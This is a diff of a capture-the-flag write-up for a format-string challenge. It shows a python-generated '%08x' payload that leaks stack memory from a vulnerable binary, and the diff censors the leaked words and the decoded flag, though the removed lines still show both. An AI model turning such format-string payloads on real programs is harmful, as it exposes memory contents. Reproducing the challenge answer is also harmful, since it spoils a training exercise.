@@ -27,8 +27,8 @@ Because the program reads the file into a local buffer, the flag should be in th
 First, let's verifiy that the program actually prints the stack values:
 ```sh
 app-systeme-ch5@challenge02:~$ ./ch5 `python -c "print '%08x,'*14"`
-00000020,0804b008,b7e562f3,00000000,08049ff4,00000002,bffffc14,bffffd32,0000002f,0804b008,39617044,28293664,6d617045,00000a64,
+00000020,0804b008,b7e562f3,00000000,08049ff4,00000002,bffffc14,bffffd32,0000002f,0804b008,XXXXXXXX,XXXXXXXX,XXXXXXXX,0000XXXX,
 ```
 
-The end of the output looks suspicious. If we'll convert the last 4 words we should get "9apD()6dmapEd".<br>
+The end of the output looks suspicious. If we'll convert the last 4 words we should get "<censored>".<br>
 And if we'll convert it to big-endian format (as it should be - the memory saves the bytes in little endian) then we should get the flag.
